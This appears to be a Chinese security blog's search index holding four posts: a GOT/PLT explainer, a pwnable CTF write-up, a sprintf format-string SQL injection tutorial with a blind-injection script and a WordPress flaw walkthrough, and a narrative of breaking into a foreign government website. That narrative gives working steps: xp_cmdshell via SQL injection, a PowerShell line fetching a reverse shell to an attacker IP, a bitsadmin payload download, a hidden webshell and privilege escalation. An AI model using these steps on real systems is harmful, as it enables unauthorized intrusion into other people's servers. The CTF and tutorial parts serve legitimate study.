<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[深入理解GOT表和PLT表]]></title>
    <url>%2F2020%2F02%2F08%2F1%2F</url>
    <content type="text"><![CDATA[一起感受二进制魅力所在 0x01 前言 操作系统通常使用动态链接的方法来提高程序运行的效率。在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。这样的设计就能提高程序运行的流畅度，也减少了内存空间。而且现代操作系统不允许修改代码段，只能修改数据段，那么GOT表与PLT表就应运而生。 0x02 初探GOT表和PLT表 我们先简单看一个例子我们跟进一下scanf@plt会发现，有三行代码123jmp 一个地址push 一个值到栈里面jmp 一个地址 看函数的名字就可以知道这是scanf函数的plt表，先不着急去了解plt是做什么用的，我们继续往下看我们先看一下第一个jmp是什么跳到哪里其实这是got表对应函数的got表，而且我们会发现0x201020的值是压栈命令的地址，其他地方为0，此时就想问：一、got表与plt表有什么意义，为什么要跳来跳去？二、got表与plt表有什么联系，有木有什么对应关系？那么带着疑问先看答案，再去印证我们要明白操作系统通常使用动态链接的方法来提高程序运行的效率，而且不能回写到代码段上。在上面例子中我们可以看到，call scanf —&gt; scanf的plt表 —&gt;scanf的got表，至于got表的值暂时先不管，我们此刻可以形成这样一个思维，它能从got表中找到真实的scanf函数供程序加载运行。我们这么认为后，那么这就变成了一个间接寻址的过程我们就把获取数据段存放函数地址的那一小段代码称为PLT（Procedure Linkage Table）过程链接表存放函数地址的数据段称为GOT（Global Offset Table）全局偏移表。我们形成这么一个思维后，再去仔细理解里面的细节 0x03 再探GOT表和PLT表 已经明白了这么一个大致过程后，我们来看一下这其中是怎么一步一步调用的上面有几个疑点需要去解决：一、got表怎么知道scanf函数的真实地址？二、got表与plt表的结构是什么？我们先来看plt表刚才发现scanf@plt表低三行代码是 jmp 一个地址 ，跟进看一下是什么其实这是一个程序PLT表的开始（plt[0]），它做的事情是：12push got[1]jmp **got[2] 后面是每个函数的plt表。此时我们再看一下这个神秘的GOT表除了这两个（printf和scanf函数的push 0xn的地址，也就是对应的plt表的第二条代码的地址），其它的got[1]， got[2] 为0，那么plt表只想为0的got表干什么呢？因为我们落下了一个条件，现代操作系统不允许修改代码段，只能修改数据段，也就是回写，更专业的称谓应该是运行时重定位。我们把程序运行起来，我们之前的地址和保存的内容就变了在这之前，我们先把链接时的内容保存一下，做一个对比12345② 寻找printf的plt表③ jmp到plt[0]④ jmp got[2] -&gt; 0x00000⑤⑥ printf和scanf的got[3] got[4] -&gt; plt[1] plt[2]的第二条代码的地址⑦⑧ 证实上面一点 运行程序，在scanf处下断点可以发现，此时scanf@plt表变了，查看got[4]里内容依然是push 0x1所在地址继续调试，直到这里，got[4]地址被修改此时想问了，这是哪里？然后就是got[2]中call&lt;_dl_fixup&gt;从而修改got[3]中的地址那么问题就来了，刚才got[2]处不是0吗，怎么现在又是这个(_dl_runtime_resolve)？这就是运行时重定位。其实got表的前三项是：123got[0]：address of .dynamic section 也就是本ELF动态段(.dynamic段）的装载地址got[1]：address of link_map object( 编译时填充0）也就是本ELF的link_map数据结构描述符地址，作用：link_map结构，结合.rel.plt段的偏移量，才能真正找到该elf的.rel.plt表项。got[2]：address of _dl_runtime_resolve function (编译时填充为0) 也就是_dl_runtime_resolve函数的地址，来得到真正的函数地址，回写到对应的got表位置中。 那么此刻，got表怎么知道scanf函数的真实地址？这个问题已经解决了。我们可以看一下其中的装在过程：说到这个，可以看到在_dl_runtimw_resolve之前和之后，会将真正的函数地址，也就是glibc运行库中的函数的地址，回写到代码段，就是got[n]（n&gt;=3）中。也就是说在函数第一次调用的时，才通过连接器动态解析并加载到.got.plt中，而这个过程称之为延时加载或者惰性加载。到这里，也要接近尾声了，当第二次调用同一个函数的时候，就不会与第一次一样那么麻烦了，因为got[n]中已经有了真实地址，直接jmp该地址即可。 0x04 尾记 忘记当时学习时看的哪位大佬的文章了，看到了大佬精心制作的一张动图，在此借用一下，特别感谢。 想学习二进制的pwn弟弟还需要努力，希望我的小白学习经验记录下来可以帮助更多和我一样的小白。]]></content>
      <categories>
        <category>二进制安全</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable-fd]]></title>
    <url>%2F2020%2F02%2F07%2F1%2F</url>
    <content type="text"><![CDATA[想学二进制的pwn弟弟正在艰难的起步 0x01 前言 首先我们先普及一下什么是File descriptor？维基百科中说：is an abstract indicator (handle) used to access a file or other input/output resource一个文件或其他输入/输出资源的抽象指示符在操作系统中可以这样去理解：进程(数值+指针)-&gt;系统(文件表中一系列操作)-&gt;引节点表(描述文件系统对象)那么进程中的file descriptor的这个数值其实就是 is an abstract indicator (handle) used to access a file or other input/output resource 然后他是指向相应的file table 0x02 深入理解File descriptor 我们来看四个file descriptor的值会以此增加，他们只想不同的操作那么为什么从3开始？是不是巧合？012去哪呢？在证明0、1、2的去向之前，我们先看一下file descriptor值的分配规则：fd0与fd1从3开始依次递增，我们刚才的第二个问题就不是巧合，然后我们把fd0的句柄close掉，也就说刚才的3关闭了，重新开始一个fd2，发现fd2的值为3，而不是5，也就是占用了刚才关闭的fd0的值我们就不妨这么猜测，如下图假如继续fd3=open，那么fd3值为5，也就是在红色区域那么我们可以初步得出一个结论，分配原则：寻找没有被占用的最低的值，然后去占用那么我们证实我们的结论和探寻0、1、2在哪？其实那么，我们关闭stdin标准输入来看下会发生什么？运行fd后直接输入数值，两次不一样，也就是标准输入被关闭，in自动填充一个随机值继续关闭stdout输入hello后，没有执行printf输出函数，然后我们将stdout关闭调，新开一个fd，按照我们之前的推断那么fd值应该为1 0x03 pwnable-fd 把结论进行验证，使得对file descriptor更深刻了，我们来做一下pwnable的fd题目巩固一下：ssh连上后，cat fd.c只需要让buf的值为 LETMEWIN 即可cat flag，buf的是read()函数从fd中获取的，fd又是atoi(argv[1]) - 0x1234得来的，可以控制。那么根据我们刚才学习的file descriptor的知识，只需要让fd为0，那么buf的值就是可以通过输入控制的，计算可以知道argv[1]的值4660虽然flag得到了，为了学习pwn，练习写一下exp 0x04 尾记 想学习二进制的pwn弟弟还需要努力，希望我的小白学习经验记录下来可以帮助更多和我一样的小白。]]></content>
      <categories>
        <category>二进制安全</category>
        <category>pwn</category>
        <category>pwnable</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
        <tag>pwnable</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透随笔-记一次境外网站渗透]]></title>
    <url>%2F2019%2F11%2F17%2F1%2F</url>
    <content type="text"><![CDATA[写下发生的故事，细品人生的乐趣。 0x1 Forward 前段时间，某位师傅找到国外政府网站的sql注入 拿到站点简单测试了下发现123数据库：mssql系统版本：windows服务器可以使用xp_cmdshell 执行1payload: aspx?AticalID=&apos;;use master;exec dbo.xp_cmdshell &apos;ping [服务器]&apos;;--+ 可以发现xp_cmdshell可使用，下一步就是找一下绝对路径，写shell直接拿下，在寻找绝对路径的时候，把url后面一部分上去后，会成功跳转到另一个网站 此时正式开始了 0x2 曲折的getshell获取绝对路径 很显然存在注入，但是不存在万能密码，可惜了，不过却可以从报错信息中发现绝对路径 此时把xp_cmdshell激活，然后把扩展库也激活1payload : admin&apos; exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;,1;reconfigure;--+ 页面返回正常，应该是语句执行成功，于是ping一下服务器看一下时候可以使用，在这个时候有一个不错的收获，还想来源ip与之前那个政府站的ip是一样，猜测iis绑定了多个域名。 尝试写shell 此时先写一个txt文件试探一下是否可行 虽然返回正常，但是无法访问http://xxx.xxx.xxx/a.txt，找不到资源，当时在想是不不能写，很无奈，就去尝试可不可以直接反弹shell, 1C:\Users\&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress xxx.xxx.xxx.xxx -p 8080 但是360直接报毒，猜想这个办法行不通，试了一下果然不行，然后尝试远程下载我的服务器上的免杀msf，然后执行 1bitsadmin /transfer mydownloadjob /download /priority normal http://xxx.xxx.xxx.xxx/msf.exe %temp%/msf.exe 尝试去访问，网页404，查看apache日志，果然没有该ip的访问记录，这个办法pass，是不是杀软太强，或者权限太低，无法执行下载命令。然而就在走投无路的时候，事情出现了转机，在回过头来自习琢磨payload的时候，发现1c:\EMTTS Data\ 这个地方不对，本地尝试果真dos下路径有空格会报错，百度一波解决方法https://www.cnblogs.com/hoojjack/p/7010814.html 加上双引号后，重新构造payload，访问a.txt，有了收获 嘻嘻嘻，欢欢喜喜写shell 12这里普及一个小知识：&lt;&gt;在dos命令中需要转义，本地尝试了下，payload中知识&lt;&gt;需要转义。 访问a.aspx发现404，只能说需要上免杀，不过之前应该好奇看看是什么杀软（国外不会也用360吧23333） 12payload:tasklist &gt; &quot;c:\EMTTS Data\xxxx\xxx\b.txt&quot; 百度一下123ESET这一名称最早来源于埃及神话中的女神Isis。Isis又称作Aset或Eset，是地神Geb和天神Nut的女儿，是主管爱情和富庶的女神，也是负责治疗和魔力的女神。ESET在英文中可以理解为Essential Solution Against Evolving Threats 之后尝试写冰蝎马，虽然写进去了，访问时出错 冰蝎连接也不行，仔细检查语句，始终连接不上又是一个峰回路转，不断尝试新的payload，不同的姿势，终于使用 &gt;&gt; 追加符号写文件，居然可以成功getshell，仔细操作不多说，很简单的操作 至此成功getshell 提权 查看下系统信息，端口服务信息，路由信息 把补丁放在对比工具中 神器网站：https://bugs.hacking8.com/tiquan/另附几个：https://github.com/SecWiki/windows-kernel-exploits （补丁）、 https://www.uedbox.com/post/8744/ （本地提权工具） 现在先把shell文件加一个隐藏权限1234attrib +s +h a.aspxattrib命令 用于修改文件属性+s 设置系统文件属性+h 设置隐藏属性 但是发现权限不够，还是要提权，试过上传免杀msfpayload，但是通信时被杀，此方法pass，于是根据检查出来的漏洞进行提权（该方法后续尝试），因为是iis，直接祭出iis通杀0day 当然其他的方法也是可以的，后来用ms16-032也可以提权成功附网址:https://github.com/1234xxh/windows-kernel-exploits/tree/master/MS16-032 (fork来的) 发现3389设计开着的，直接远程连接 进去后找到这搞鬼的的东西 开始艰难的内网渗透（持续更新…） 感谢梦师傅的耐心指导，tql，我就是你的迷弟…]]></content>
      <categories>
        <category>渗透</category>
        <category>getshell</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>渗透</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入解析sprintf格式化字符串漏洞]]></title>
    <url>%2F2018%2F11%2F05%2F1%2F</url>
    <content type="text"><![CDATA[只有不断地探索新的知识，才能感受到无穷的乐趣 0x01 sprintf()讲解首先我们先了解sprintf()函数 sprintf() 函数把格式化的字符串写入变量中。123sprintf(format,arg1,arg2,arg++)arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 &quot;\$&quot; 组成。 通过几个例子回顾一下sprintf 例子1：12345678&lt;?php$number = 123;$txt = sprintf(&quot;带有两位小数：%1\$.2f&lt;br&gt;不带小数：%1\$u&quot;,$number);echo $txt;?&gt;输出结果:带有两位小数：123.00 不带小数：123 例子2：12345678910111213141516171819&lt;?php$num1 = 123456789;$num2 = -123456789;$char = 50;// ASCII 字符 50 是 2//注释：格式值 &quot;%%&quot; 返回百分号echo sprintf(&quot;%%b = %b&quot;,$num1).&quot;&lt;br&gt;&quot;; // 二进制数echo sprintf(&quot;%%c = %c&quot;,$char).&quot;&lt;br&gt;&quot;; // ASCII 字符echo sprintf(&quot;%%s = %s&quot;,$num1).&quot;&lt;br&gt;&quot;; // 字符串echo sprintf(&quot;%%x = %x&quot;,$num1).&quot;&lt;br&gt;&quot;; // 十六进制数（小写）echo sprintf(&quot;%%X = %X&quot;,$num1).&quot;&lt;br&gt;&quot;; // 十六进制数（大写）?&gt;输出结果:%b = 111010110111100110100010101%c = 2 //注意var_dump(&apos;2&apos;)为string%s = 123456789%x = 75bcd15%X = 75BCD15 0x02 sprintf注入原理底层代码实现 我们来看一下sprintf()的底层实现方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475switch (format[inpos]) &#123;case &apos;s&apos;: &#123;zend_string *t;zend_string *str = zval_get_tmp_string(tmp, &amp;t);php_sprintf_appendstring(&amp;result, &amp;outpos,ZSTR_VAL(str),width, precision, padding,alignment,ZSTR_LEN(str),0, expprec, 0);zend_tmp_string_release(t);break; &#125; case &apos;d&apos;: php_sprintf_appendint(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, always_sign); break; case &apos;u&apos;: php_sprintf_appenduint(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment); break; case &apos;g&apos;: case &apos;G&apos;: case &apos;e&apos;: case &apos;E&apos;: case &apos;f&apos;: case &apos;F&apos;: php_sprintf_appenddouble(&amp;result, &amp;outpos, zval_get_double(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign ); break; case &apos;c&apos;: php_sprintf_appendchar(&amp;result, &amp;outpos, (char) zval_get_long(tmp)); break; case &apos;o&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 3, hexchars, expprec); break; case &apos;x&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, hexchars, expprec); break; case &apos;X&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, HEXCHARS, expprec); break; case &apos;b&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 1, hexchars, expprec); break; case &apos;%&apos;: php_sprintf_appendchar(&amp;result, &amp;outpos, &apos;%&apos;); break; default: break;&#125; 可以看到， php源码中只对15种类型做了匹配， 其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题：没做字符类型检测的最大危害就是它可以吃掉一个转义符\, 如果%后面出现一个\,那么php会把\当作一个格式化字符的类型而吃掉\, 最后%\（或%1$\）被替换为空 因此sprintf注入，或者说php格式化字符串注入的原理为：要明白%后的一个字符(除了%，%上面表格已经给出了)都会被当作字符型类型而被吃掉，也就是被当作一个类型进行匹配后面的变量，比如%c匹配asciii码，%d匹配整数，如果不在定义的也会匹配，匹配空，比如%\，这样我们的目的只有一个，使得单引号逃逸，也就是能够起到闭合的作用。 这里我们举两个例子NO.1 不使用占位符号12345678&lt;?php$sql = &quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot; ;$args = &quot;admin&quot; ;echo sprintf ( $sql , $args ) ;//=&gt; echo sprintf(&quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot;, &quot;admin&quot;);//此时%\回去匹配admin字符串，但是%\只会匹配空运行后的结果select * from user where username = &apos;&apos; and 1=1#&apos; NO.2 使用占位符号12345678910&lt;?php$input = addslashes (&quot;%1$&apos; and 1=1#&quot; );$b = sprintf (&quot;AND b=&apos;%s&apos;&quot;, $input );$sql = sprintf (&quot;SELECT * FROM t WHERE a=&apos;%s&apos; $b &quot;, &apos;admin&apos; );//对$input与$b进行了拼接//$sql = sprintf (&quot;SELECT * FROM t WHERE a=&apos;%s&apos; AND b=&apos;%1$\&apos; and 1=1#&apos; &quot;, &apos;admin&apos; );//很明显，这个句子里面的\是由addsashes为了转义单引号而加上的，使用%s与%1$\类匹配admin，那么admin只会出现在%s里，%1$\为空echo $sql ;运行后的结果SELECT * FROM t WHERE a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos; 对于这个问题，我们还可以这样写12$sql = sprintf (&quot;SELECT * FROM table WHERE a=&apos;%1$\&apos; AND b=&apos;%d&apos; and 1=1#&apos; &quot;,&apos;admin&apos;);//result: SELECT * FROM t WHERE a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos; 第一个格式化处匹配时为空，会让给后面的格式化匹配 以上两个例子是吃掉’\’来使得单引号逃逸出来下面这个例子我们构造单引号 NO.3 对%c进行利用123456&lt;? php$input1 = &apos;%1$c) OR 1 = 1 /*&apos; ;$input2 = 39 ;$sql = &quot;SELECT * FROM foo WHERE bar IN (&apos; $input1 &apos;) AND baz = %s&quot; ;$sql = sprintf ( $sql , $input2 );echo $sql ; %c起到了类似chr()的效果，将数字39转化为‘，从而导致了sql注入。所以结果为：1SELECT * FROM foo WHERE bar IN (&apos;&apos;) OR 1 = 1 /*) AND baz = 39 小结 漏洞利用条件 sql语句进行了字符拼接 拼接语句和原sql语句都用了vsprintf/sprintf 函数来格式化字符串1234567ps:mysql&gt; SELECT ascii(&apos;\&apos;&apos;);+-------------+| ascii(&apos;\&apos;&apos;) |+-------------+| 39 |+-------------+ 0x03 题目训练一道注入题目 形式很像SQL注入，而且题目中提示为SQLI先试了一下弱口令，确定username为admin那么就对username与password进行注入，开始普通注入，二次解码，宽字节，过滤空格，过滤关键字等姿势进行构造注入语句都无果，而且还耗费大量的时间，不过后来get到一种姿势，使用burpsuit的intruder跑一下，来查看那些字母或者字符没有被过滤掉（waf字典）后来发现%可疑，于是拿出来repeater一下sprintf函数出错，那么sprintf是什么，格式化字符串，于是乎就懂得其中的原理了，是其单引号逃逸构造username=admin%1$\’ and 1=2# 与 username=admin%1$\’ and 1=1#发现如下的结果可以发现’后面的语句带入执行了，这就是注入点，使用sqlmap跑一下事先抓取post包1python sqlmap.py -r 3.txt -p username --level 3 --dbs --thread 10 于是对ctf进行跑tables得到对flag跑columns得到对每个列进行dump但是dump下来不对，找了一波原因没有找到，开始用脚本跑跑完后才发现sqlmap跑出来的列不对，应该是flag，于是1python sqlmap.py -r 3.txt -p username --level 3 -D ctf -T flag -C flag --dump --thread 10 才得到正确结果 ：）下面是脚本跑的 中心思想 先判断length然后使用ascii判断字母ascii(substr(database(),” + str(i) +”,1))=” + str(ord(c)) + “#”使用这个语句进行判断 涉及到的一些知识点： 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143#coding:utf-8import requestsimport stringdef boom(): url = r&apos;http://f6f0cdc51f8141a6b1a8634161859c1c78499dc70eea47f0.game.ichunqiu.com/&apos; s = requests.session() //会话对象requests.Session能够跨请求地保持某些参数，比如cookies，即在同一个Session实例发出的所有请求都保持同一个cookies,而requests模块每次会自动处理cookies，这样就很方便地处理登录时的cookies问题。 dic = string.digits + string.letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-=&quot; right = &apos;password error!&apos; error = &apos;username error!&apos; lens = 0 i = 0 //确定当前数据库的长度 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;length(database())&gt;&quot; + str(i) + &quot;#&quot; data=&#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: lens=i break i+=1 pass print(&quot;[+]length(database()): %d&quot; %(lens)) //确定当前数据库的名字 strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr(database(),&quot; + str(i) +&quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]database():%s&quot; %(strs)) lens=0 i = 1 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;&quot; + str(i) + &quot;#&quot; //对当前的数据库，查询第一个表的长度 data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: lens = i break i+=1 pass print(&quot;[+]length(table): %d&quot; %(lens)) strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot; + str(i) +&quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; // 数字一定要str才可以传入 data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]table_name:%s&quot; %(strs)) tablename = &apos;0x&apos; + strs.encode(&apos;hex&apos;) //编码为16进制 table_name = strs lens=0 i = 0 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(column_name) from information_schema.columns where table_name = &quot; + str(tablename) + &quot; limit 0,1)&gt;&quot; + str(i) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: lens = i break i+=1 pass print(&quot;[+]length(column): %d&quot; %(lens)) strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr((select column_name from information_schema.columns where table_name = &quot; + str(tablename) +&quot; limit 0,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]column_name:%s&quot; %(strs)) column_name = strs num=0 i = 0 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select count(*) from &quot; + table_name + &quot;)&gt;&quot; + str(i) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: num = i break i+=1 pass print(&quot;[+]number(column): %d&quot; %(num)) lens=0 i = 0 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(&quot; + column_name + &quot;) from &quot; + table_name + &quot; limit 0,1)&gt;&quot; + str(i) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: lens = i break i+=1 pass print(&quot;[+]length(value): %d&quot; %(lens)) i=1 strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or ascii(substr((select flag from flag limit 0,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:&apos;1&apos;&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]flag:%s&quot; %(strs))if __name__ == &apos;__main__&apos;: boom() print &apos;Finish!&apos; 1234567891011121314&lt;?php$input = addslashes(&quot;%1$&apos; and 1=1#&quot;);echo $input;echo &quot;\n&quot;;$b = sprintf(&quot;AND b=&apos;%s&apos;&quot;,$input);echo $b;echo &quot;\n&quot;;$sql = sprintf(&quot;select * from t where a=&apos;%s&apos; $b&quot;,&apos;admin&apos;);echo $sql;&gt;&gt;&gt;结果%1$\&apos; and 1=1#AND b=&apos;%1$\&apos; and 1=1#&apos;select * from t where a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos; 格式字符%后面会吃掉一个\即%1$\被替换为空，逃逸出来一个单引号，造成注入. 0x04 Wordpress格式化字符串漏洞漏洞跟踪 wordpress版本小于4.7.5在后台图片删除的地方存在一处格式化字符串漏洞官方在4.7.6已经给出了补救办法在我们即将要说的地方增加了这么一端代码1$query = preg_replace( &apos;/%(?:%|$|([^dsF]))/&apos;, &apos;%%\\1&apos;, $query ); // escape any unescaped percents 只允许 %后面出现dsF 这三种字符类型， 其他字符类型都替换为%%\1, 而且还禁止了%, $ 这种参数定位 首先我们找到upload.php可以发现在deleta中 $post_id_del（比如int()） 未经过处理，直接传入123456789101112case &apos;delete&apos;: if ( !isset( $post_ids ) ) break; foreach ( (array) $post_ids as $post_id_del ) &#123; if ( !current_user_can( &apos;delete_post&apos;, $post_id_del ) ) //跟进 wp_die( __( &apos;Sorry, you are not allowed to delete this item.&apos; ) ); if ( !wp_delete_attachment( $post_id_del ) ) wp_die( __( &apos;Error in deleting.&apos; ) ); &#125; $location = add_query_arg( &apos;deleted&apos;, count( $post_ids ), $location ); break; 跟进wp_delete_attachment( )函数其中参数$post_id_del为图片的postidwp_delete_attachment( )中 调用了delete_metadata 函数12345function wp_delete_attachment( $post_id, $force_delete = false ) &#123;.......delete_metadata( &apos;post&apos;, null, &apos;_thumbnail_id&apos;, $post_id, true ); // delete all for any posts.......&#125; 继续跟进delete_metadata函数漏洞触发点主要在wp-includes/meta.php 的 delete_metadata函数里面， 有如下代码:12345678if ( $delete_all ) &#123; $value_clause = &apos;&apos;; if ( &apos;&apos; !== $meta_value &amp;&amp; null !== $meta_value &amp;&amp; false !== $meta_value ) &#123; $value_clause = $wpdb-&gt;prepare( &quot; AND meta_value = %s&quot;, $meta_value ); &#125; $object_ids = $wpdb-&gt;get_col( $wpdb-&gt;prepare( &quot;SELECT $type_column FROM $table WHERE meta_key = %s $value_clause&quot;, $meta_key ) );&#125; 调用了两个prepare函数跟进prepare函数12345678910111213141516171819public function prepare( $query, $args ) &#123; if ( is_null( $query ) ) return; // This is not meant to be foolproof -- but it will catch obviously incorrect usage. if ( strpos( $query, &apos;%&apos; ) === false ) &#123; _doing_it_wrong( &apos;wpdb::prepare&apos;, sprintf( __( &apos;The query argument of %s must have a placeholder.&apos; ), &apos;wpdb::prepare()&apos; ), &apos;3.9.0&apos; );&#125; $args = func_get_args(); array_shift( $args ); // If args were passed as an array (as in vsprintf), move them up if ( isset( $args[0] ) &amp;&amp; is_array($args[0]) ) $args = $args[0]; $query = str_replace( &quot;&apos;%s&apos;&quot;, &apos;%s&apos;, $query ); // in case someone mistakenly already singlequoted it $query = str_replace( &apos;&quot;%s&quot;&apos;, &apos;%s&apos;, $query ); // doublequote unquoting $query = preg_replace( &apos;|(?&lt;!%)%f|&apos; , &apos;%F&apos;, $query ); // Force floats to be locale unaware $query = preg_replace( &apos;|(?&lt;!%)%s|&apos;, &quot;&apos;%s&apos;&quot;, $query ); // quote the strings, avoiding escaped strings like %%s array_walk( $args, array( $this, &apos;escape_by_ref&apos; ) ); return @vsprintf( $query, $args );&#125; 详细看prepare函数对传入参数的处理过程首先对%s进行处理1234$query = str_replace( &quot;&apos;%s&apos;&quot;, &apos;%s&apos;, $query ); // in case someone mistakenly already singlequoted it $query = str_replace( &apos;&quot;%s&quot;&apos;, &apos;%s&apos;, $query ); // doublequote unquoting $query = preg_replace( &apos;|(?&lt;!%)%f|&apos; , &apos;%F&apos;, $query ); // Force floats to be locale unaware $query = preg_replace( &apos;|(?&lt;!%)%s|&apos;, &quot;&apos;%s&apos;&quot;, $query ); // quote the strings, avoiding escaped strings like %%s 把’%s’替换为%s，然后再把”%s”替换成%s，替换为浮点数%F 把%s替换成’%s’最后再进行vsprintf( $query, $args );对拼接的语句进行格式化处理 我们一步步分析假设传入的$meta_value为’admin’1$wpdb-&gt;prepare( &quot; AND meta_value = %s&quot;, $meta_value ); 经过prepare函数处理后得到12vsprintf( &quot; AND meta_value = &apos;%s&apos;&quot;,&apos;admin&apos;)=&gt; AND meta_value = &apos;admin&apos; return到上一级函数后，继续执行这一条拼接语句：1$wpdb-&gt;prepare( &quot;SELECT $type_column FROM $table WHERE meta_key = %s $value_clause&quot;, $meta_key ) 经过prepare函数处理后得到12vsprintf( &quot;SELECT $type_column FROM $table WHERE meta_key = &apos;%s&apos; AND meta_value = &apos;admin&apos;&quot;,&apos;admin&apos;)=&gt; SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = &apos;admin&apos; 看起来一切都很正常，毫无bug但是我们可以思考一下，怎样使其形成注入呢？s&gt; 或者说怎样逃逸一个单引号？在之前我们先看一下，可控变量 $post_id_del 的路线1$post_id_del =&gt; $post_id =&gt; $meta_value =&gt; $args =&gt; $query 显然这里面两处admin都有单引号，而且两处都与 $post_id_del 联系，如何来选择？ 对于第一处单引号它是通过一次替换处理得到的，显然是对单引号&gt;无法处理对于第二处单引号经过两次的替换，（这里的意思是执行了两次的替换代码，可能第二段代码对他没有起到实质性的作用，仅仅是去点单引号然后又加上单引号）但是这一出经过了两次处理是必须的，那么我们是否能够是构造出另一个单引号（此时第二处有三个单引号）就可以闭合前面的单引号了 最重要的是，第二次的替换处理的变量是可控的，因此要引入单引号，我们需要$meta_value含有%s那么第一次的结果为12AND meta_value = &apos;X%sY&apos;（其中XY为未知量）//这里需要注意，为什么%s不被单引号围起来，我看过一篇博客，它是写的&apos;%s&apos;，这显然是错的，为什么呢？我们生成了&apos;%s&apos;是没错，不过还原一下过程就知道了，首先我们生成了AND meta_value = &apos;%s&apos;，注意此时与$meta_value没有半毛钱关系，后来的vsprintf后，才与$meta_value有了关系，原来的%s被替换成了X%sY，值得注意的是这里的%s没有经过任何处理，处理是在第二轮进行的，这是后话。 第二次后的结果为123SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = &apos;X&apos;%s&apos;Y&apos;（对于第二处的%s我们先不要带入格式化后的值，其实真实的语句应该为：SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = &apos;X&apos;admin&apos;Y&apos;） 分析到这里，相信大家应该知道传值（$meta_value）使单引号逃逸出来了吧 admin显然是多余的，那么我们需要把它放在单引号里面，因此第二个单引号需要去掉，那么第四个单引号需要注释掉，这就很轻而易举地构造sql语句AND meta_value = ‘Xadmin’YY里面就是我们注入的代码 漏洞利用 怎么去传值呢？利用格式化字符串漏洞 